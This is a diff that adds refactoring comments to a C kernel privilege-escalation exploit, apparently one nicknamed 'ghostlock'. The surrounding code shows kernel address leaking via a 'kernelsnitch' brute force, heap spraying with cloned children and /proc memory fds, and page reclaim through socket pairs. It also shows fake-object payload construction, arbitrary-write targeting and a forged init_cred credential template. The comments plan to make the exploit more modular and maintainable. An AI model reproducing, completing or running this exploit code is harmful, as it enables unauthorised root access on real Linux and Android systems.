@@ -17,6 +17,8 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+/* Decoupling plan: compute elapsed monotonic time. Input: reference timestamp;
+ * output: milliseconds. Future: shared_elapsed_ms(const struct timespec *). */
 static long long ms_since(struct timespec *t0) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -45,16 +47,24 @@ int pselect_custom_write;
 uintptr_t pselect_custom_target;
 int pselect_child_node;  /* Preserve initialized bytes when set. */
 
+/* Decoupling plan: configure the next legacy payload write. Inputs: target and
+ * mode; output: implicit globals. Future: write_request_init() returning an
+ * immutable WriteRequest passed to payload and route functions. */
 void set_pselect_write_mode(uintptr_t target, int mode) {
   pselect_custom_target = target;
   pselect_custom_write = mode;
 }
 
+/* Decoupling plan: clear legacy write globals. Input/output: implicit write
+ * state. Future: remove after callers use scoped immutable WriteRequest. */
 void clear_pselect_write(void) {
   pselect_custom_write = 0;
   pselect_custom_target = 0;
 }
 
+/* Decoupling plan: decide whether TCP zerocopy is selected. Inputs: profile and
+ * runtime-config snapshot; output: boolean. Future:
+ * tcp_zerocopy_supports(profile, config), with no environment reread. */
 int tcp_route_selected(void) {
   /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
   const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
@@ -64,29 +74,43 @@ int tcp_route_selected(void) {
   return active_offsets && active_offsets->compact_waiter;
 }
 
+/* Decoupling plan: report multicast-waiter capability. Input: profile; output:
+ * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
 int kernel5_route_selected(void) {
   return active_offsets && active_offsets->kernel_major == 5 &&
          active_offsets->mcast_waiter_off > 0;
 }
 
+/* Decoupling plan: allocate the address-discovery engine. Inputs: profile/hash
+ * configuration; output: initialized context. Future:
+ * kernelsnitch_context_init(KernelSnitchContext *, ...). */
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
 }
 
+/* Decoupling plan: query discovered collisions. Input: snitch context; output:
+ * boolean. Future: kernelsnitch_context_is_ready(const context *). */
 int kernelsnitch_collisions_ready(void) {
   return kernelsnitch_found_collisions(ks);
 }
 
+/* Decoupling plan: advance collision discovery. Input/output: snitch context;
+ * future: kernelsnitch_context_scan(KernelSnitchContext *). */
 void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
+/* Decoupling plan: obtain the selected mm_struct candidate. Input: const snitch
+ * context; output: kernel address. Future: kernelsnitch_context_result(). */
 uintptr_t current_kernelsnitch_mm_struct(void) {
   return ks->mm_struct;
 }
 
+/* Decoupling plan: stop workers and release discovery state. Input: snitch
+ * context; output: retained result address. Future: split result() and
+ * kernelsnitch_context_destroy(). */
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
@@ -114,6 +138,8 @@ void read_first_line(const char *path, char *buf, size_t len) {
   buf[strcspn(buf, "\r\n")] = 0;
 }
 
+/* Decoupling plan: log a captured runtime configuration. Input: RuntimeConfig;
+ * output: diagnostics only. Future: runtime_config_log(const RuntimeConfig *). */
 void log_startup_context(void) {
   char attr[256];
   char enforce[32];
@@ -204,18 +230,26 @@ uint64_t g_direct_map_end = DIRECT_MAP_END;
 /* Selected entry's init_cred image address. */
 uintptr_t g_init_cred_image;
 
+/* Decoupling plan: resolve physical/image address mapping. Input: target
+ * profile; output: ResolvedAddresses. Future: resolve_runtime_addresses(). */
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
           (unsigned long long)p0_kernel_phys_load,
           (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
 }
 
+/* Decoupling plan: translate an image address through the selected SoC mapping.
+ * Inputs: ResolvedAddresses and image address; output: alias. Future:
+ * address_space_data_alias(const ResolvedAddresses *, uintptr_t). */
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = p0_kernel_phys_load + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
+/* Decoupling plan: compatibility address translator. Inputs: explicit address
+ * space and image address; output: runtime address. Future:
+ * address_space_resolve_data(); remove implicit profile/global reads. */
 uintptr_t data_addr(uintptr_t image_addr) {
   return p0_data_alias(image_addr);
 }
@@ -228,6 +262,9 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
+/* Decoupling plan: encode the profile-specific credential template. Inputs:
+ * profile, destination and offset; output: validation/status. Future:
+ * payload_build_credential_template(profile, buffer, offset). */
 static int fill_profile_cred_copy(unsigned char *p, size_t off) {
   if (!active_offsets || !active_offsets->cred_copy_size ||
       active_offsets->cred_copy_size > ORDER3_SIZE ||
@@ -266,6 +303,8 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
   return 1;
 }
 
+/* Decoupling plan: create an mm-allocation helper child. Input: heap context;
+ * output: owned PID. Future: heap_context_spawn_mm_child(). */
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -281,6 +320,8 @@ pid_t clone_child(void) {
   return child;
 }
 
+/* Decoupling plan: create and retain the leak helper child. Input/output: heap
+ * context; output: owned PID. Future: heap_context_spawn_leak_child(). */
 pid_t clone_leak_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -290,12 +331,16 @@ pid_t clone_leak_child(void) {
   return child;
 }
 
+/* Decoupling plan: open the child-related memfd allocation. Input: PID; output:
+ * owned fd/error. Future: heap_context_open_memfd(context, child). */
 int open_memfd(pid_t child) {
   char path[64];
   snprintf(path, sizeof(path), "/proc/%d/mem", child);
   return SYSCHK(open(path, O_RDONLY));
 }
 
+/* Decoupling plan: terminate and reap a heap helper. Input: owned PID; output:
+ * ownership cleared. Future: heap_context_reap_child(). */
 void kill_child(pid_t child) {
   if (child <= 0) {
     return;
@@ -304,6 +349,8 @@ void kill_child(pid_t child) {
   SYSCHK(waitpid(child, NULL, 0));
 }
 
+/* Decoupling plan: release the current reclaim socket pair. Input/output: heap
+ * context. Future: reclaim_pair_destroy(ReclaimPair *). */
 void close_reclaim_sockets(void) {
   for (int i = 0; i < 2; i++) {
     if (reclaim_sv[i] >= 0) {
@@ -313,6 +360,8 @@ void close_reclaim_sockets(void) {
   }
 }
 
+/* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
+ * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
 int quarantine_reclaim_sockets(void) {
   if (quarantined_reclaim_sv[0] >= 0 || quarantined_reclaim_sv[1] >= 0)
     return 0;
@@ -324,6 +373,8 @@ int quarantine_reclaim_sockets(void) {
   return 1;
 }
 
+/* Decoupling plan: release all quarantined reclaim ownership. Input/output:
+ * heap context. Future: heap_context_release_quarantine(). */
 void release_quarantined_reclaim_sockets(void) {
   for (int i = 0; i < 2; i++) {
     if (quarantined_reclaim_sv[i] >= 0) {
@@ -333,6 +384,8 @@ void release_quarantined_reclaim_sockets(void) {
   }
 }
 
+/* Decoupling plan: move the current payload page into the prebuilt slot. Input:
+ * heap context; output: move status. Future: payload_page_move(prebuilt,current). */
 int stash_prebuilt_page(void) {
   if (prebuilt_reclaim_sv[0] >= 0 || reclaim_sv[0] < 0)
     return 0;
@@ -350,6 +403,8 @@ int stash_prebuilt_page(void) {
   return 1;
 }
 
+/* Decoupling plan: move the prebuilt page into the active slot. Input/output:
+ * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
 int activate_prebuilt_page(void) {
   if (prebuilt_reclaim_sv[0] < 0)
     return 0;
@@ -368,6 +423,8 @@ int activate_prebuilt_page(void) {
   return 1;
 }
 
+/* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
+ * heap context. Future: payload_page_destroy(&context->prebuilt). */
 void discard_prebuilt_page(void) {
   for (int i = 0; i < 2; i++) {
     if (prebuilt_reclaim_sv[i] >= 0) {
@@ -394,6 +451,9 @@ void free_ctx_storage(struct mm_ctx *ctx) {
   ctx->mm_cnt = 0;
 }
 
+/* Decoupling plan: clean one heap-preparation attempt. Input: HeapContext;
+ * output: all attempt-owned resources released. Future:
+ * heap_context_reset_attempt(), separate from route cleanup. */
 void cleanup_page_prepare_state(void) {
   close_ctx_memfds(&prepare_ctx);
   close_ctx_memfds(&spray_ctx);
@@ -411,6 +471,8 @@ void cleanup_page_prepare_state(void) {
   skb_buf = NULL;
 }
 
+/* Decoupling plan: create a helper child and associated memfd. Input/output:
+ * heap context; output: owned fd/error. Future: heap_context_clone_memfd(). */
 int clone_memfd(void) {
   pid_t child = clone_child();
   int fd = open_memfd(child);
@@ -418,6 +480,9 @@ int clone_memfd(void) {
   return fd;
 }
 
+/* Decoupling plan: allocate the four mm-context sets used for heap shaping.
+ * Inputs: profile and HeapContext; output: initialized sets/status. Future:
+ * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
 void prepare_ctxs(void) {
   prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
@@ -436,6 +501,9 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
+/* Decoupling plan: construct shared fake objects and route-specific waiter data.
+ * Inputs: profile, addresses, immutable WriteRequest and page base; outputs:
+ * payload bytes/layout. Future: build_payload() plus three chain encoders. */
 int prepare_skb_payload(uintptr_t base) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -576,6 +644,9 @@ int prepare_skb_payload(uintptr_t base) {
   return 1;
 }
 
+/* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
+ * Inputs: HeapContext, profile and payload request; output: PayloadPage/status.
+ * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
 uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -788,6 +859,9 @@ uintptr_t prepare_kernel_page(void) {
   return base;
 }
 
+/* Decoupling plan: retry heap preparation until a usable page is available.
+ * Inputs: HeapContext and request; output: PayloadPage/status. Future:
+ * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
 uintptr_t prepare_good_kernel_page(void) {
   int max_attempts = 12;
   struct timespec t_good;
